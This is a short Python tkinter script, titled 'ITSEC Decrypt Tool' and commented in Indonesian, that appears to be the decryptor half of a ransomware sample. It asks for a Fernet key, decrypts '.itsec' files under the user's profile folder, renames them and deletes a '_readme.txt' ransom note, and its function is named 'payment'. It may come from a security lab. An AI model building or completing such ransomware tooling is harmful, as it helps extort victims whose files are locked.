import tkinter as tk
import os
from cryptography.fernet import Fernet

def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        # membaca enkripsi data
        encrypted_data = file.read()
    # memulihkan data
    decrypted_data = f.decrypt(encrypted_data)
    # menulis file ori
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def payment(target=os.environ["USERPROFILE"]):
    for p, d, f in os.walk(target):
        for name in f:
            if name.endswith((".itsec")):
                key1 = b'' + entry.get().encode('utf-8')
                source = p + name
                decrypt(os.path.join(p, name),key1)
                newFile = os.path.splitext(name)[0]
                os.rename(os.path.join(p, name), os.path.join(p,newFile))
                try:
                    os.remove(os.path.join(p, "_readme.txt"))
                except FileNotFoundError:
                    finish = "Sudah Terbayar"
                    label1 = tk.Label(root, text=finish)
                    label1.pack()



root = tk.Tk()
root.geometry("800x800")

label = tk.Label(root, text="ITSEC Decrypt Tool")
label.pack()

entry = tk.Entry(root, width=500)
entry.pack()

submit_button = tk.Button(root, text="Decrypt", command=payment)
submit_button.pack()

root.mainloop()
